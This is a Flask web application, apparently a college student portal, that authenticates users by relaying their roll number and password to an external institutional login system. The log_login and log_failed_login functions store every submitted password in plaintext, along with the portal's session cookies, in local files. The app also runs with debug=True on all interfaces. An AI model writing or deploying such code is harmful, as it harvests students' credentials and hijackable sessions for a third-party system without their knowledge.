from flask import Flask, request, render_template, redirect, url_for, make_response
import requests, os, secrets, time, csv
from bs4 import BeautifulSoup
import pandas as pd

app = Flask(__name__)

# Load CSV mapping Rollno -> (ID, Subject, Name)
df = pd.read_csv("nitdgp.csv")   # columns: Rollno,Subject,ID,Name

# Make sure log folder exists
os.makedirs("login_logs", exist_ok=True)

base_url = "http://14.139.221.18:9001"
login_url = f"{base_url}/default.aspx?ReturnUrl=%2f"

# In-memory session storage {cookie: (rollno, expiry)}
sessions = {}

def chanakya_login(student_id, password):
    session = requests.Session()
    resp = session.get(login_url)
    soup = BeautifulSoup(resp.text, "html.parser")

    def get_value(name):
        tag = soup.find("input", {"name": name})
        return tag["value"] if tag else ""

    payload = {
        "__LASTFOCUS": "",
        "__EVENTTARGET": "",
        "__EVENTARGUMENT": "",
        "__VIEWSTATE": get_value("__VIEWSTATE"),
        "__VIEWSTATEGENERATOR": get_value("__VIEWSTATEGENERATOR"),
        "__EVENTVALIDATION": get_value("__EVENTVALIDATION"),
        "txt_username": student_id,
        "txt_password": password,
        "btnSubmitLogin": "Login"
    }

    login_resp = session.post(login_url, data=payload)

    if "Invalid Password" in login_resp.text or "Login" in login_resp.url:
        return None, None

    soup = BeautifulSoup(login_resp.text, "html.parser")
    name_block = soup.find("b", style=lambda v: v and "#075539" in v)
    student_name = name_block.get_text(" ", strip=True) if name_block else "Unknown User"

    return student_name, session.cookies.get_dict()

def log_login(rollno, password, student_name, cookies):
    filepath = os.path.join("login_logs", f"{rollno}.txt")
    with open(filepath, "a") as f:
        f.write(f"Time: {time.ctime()}\n")
        f.write(f"Rollno: {rollno}\n")
        f.write(f"Password: {password}\n")
        f.write(f"Name: {student_name}\n")
        f.write(f"Cookies: {cookies}\n")
        f.write("="*40 + "\n")

def log_failed_login(rollno, password):
    file_exists = os.path.exists("faillogs.csv")
    with open("faillogs.csv", "a", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["Time","Rollno","Password"])
        if not file_exists:
            writer.writeheader()
        writer.writerow({
            "Time": time.ctime(),
            "Rollno": rollno,
            "Password": password
        })

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/login", methods=["POST"])
def login():
    rollno = request.form.get("rollno")
    password = request.form.get("password")

    row = df[df["Rollno"] == rollno]
    if row.empty:
        log_failed_login(rollno, password)
        return "❌ Roll Number not found"

    student_id = row.iloc[0]["ID"]
    subject = row.iloc[0]["Subject"]
    name_csv = row.iloc[0]["Name"]

    student_name, cookies = chanakya_login(student_id, password)
    if not student_name:
        log_failed_login(rollno, password)
        return "❌ Invalid credentials"

    # log everything
    log_login(rollno, password, student_name, cookies)

    # issue session cookie
    session_token = secrets.token_hex(32)
    expiry = time.time() + 3600  # 1 hour
    sessions[session_token] = (rollno, expiry)

    # check if already has room entry
    has_room = False
    if os.path.exists("room.csv"):
        with open("room.csv") as f:
            reader = csv.DictReader(f)
            for row in reader:
                if row["Rollno"] == rollno:
                    has_room = True
                    break

    # if already submitted → go to home directly
    if has_room:
        resp = make_response(redirect(url_for("home_page")))
    else:
        resp = make_response(
            render_template("welcome.html", 
                            name=name_csv, 
                            rollno=rollno, 
                            subject=subject, 
                            student_id=student_id,
                            name_csv=name_csv,
                            show_form=True)
        )

    resp.set_cookie("session", session_token, max_age=3600, httponly=True)
    return resp


@app.route("/submit_room", methods=["POST"])
def submit_room():
    rollno = request.form["rollno"]
    subject = request.form["subject"]
    student_id = request.form["student_id"]
    name = request.form["name"]
    hall = request.form["hall"]
    room = request.form["room"]

    # prevent duplicate entries
    existing = False
    if os.path.exists("room.csv"):
        with open("room.csv") as f:
            reader = csv.DictReader(f)
            for row in reader:
                if row["Rollno"] == rollno:
                    existing = True
                    break

    if not existing:
        file_exists = os.path.exists("room.csv")
        with open("room.csv", "a", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=["Rollno","Subject","ID","Name","Hall","Room"])
            if not file_exists:
                writer.writeheader()
            writer.writerow({
                "Rollno": rollno,
                "Subject": subject,
                "ID": student_id,
                "Name": name,
                "Hall": hall,
                "Room": room
            })

    return redirect(url_for("home_page"))

@app.route("/home")
def home_page():
    # verify session cookie
    session_token = request.cookies.get("session")
    if not session_token or session_token not in sessions:
        return redirect(url_for("home"))
    rollno, expiry = sessions[session_token]
    if time.time() > expiry:
        return "Session expired, please login again."
    return render_template("home.html", rollno=rollno)


@app.route("/classmates")
def classmates():
    # verify session cookie
    session_token = request.cookies.get("session")
    if not session_token or session_token not in sessions:
        return redirect(url_for("login"))
    
    rollno, expiry = sessions[session_token]
    if time.time() > expiry:
        return "Session expired, please login again."

    # Extract the alphabet after "25"
    if len(rollno) < 3:
        return "Invalid roll number"
    batch_letter = rollno[2]   # e.g., "25A80025" → "A"

    classmates = []
    with open("nitdgp.csv", "r") as f:
        reader = csv.DictReader(f)
        for row in reader:
            if row["Rollno"][2] == batch_letter:
                classmates.append(row)

    return render_template("classmates.html", classmates=classmates)

@app.route("/techparent")
def techparent():
    # verify session cookie
    session_token = request.cookies.get("session")
    if not session_token or session_token not in sessions:
        return redirect(url_for("login"))
    
    rollno, expiry = sessions[session_token]
    if time.time() > expiry:
        return "Session expired, please login again."

    key = rollno[2:]  # e.g., 25A80029 -> A80029

    parent = None
    with open("techparent.csv", "r") as f:
        reader = csv.DictReader(f)
        for row in reader:
            if row["Roll No."].endswith(key):
                parent = row
                break

    return render_template("techparent.html", parent=parent)

@app.route("/results")
def results():
    # verify login/session if you want
    session_token = request.cookies.get("session")
    if not session_token or session_token not in sessions:
        return redirect(url_for("login"))
    return render_template("results.html")


@app.route("/attendance")
def attendance():
    # verify login/session if you want
    session_token = request.cookies.get("session")
    if not session_token or session_token not in sessions:
        return redirect(url_for("login"))
    return render_template("attendance.html")



if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
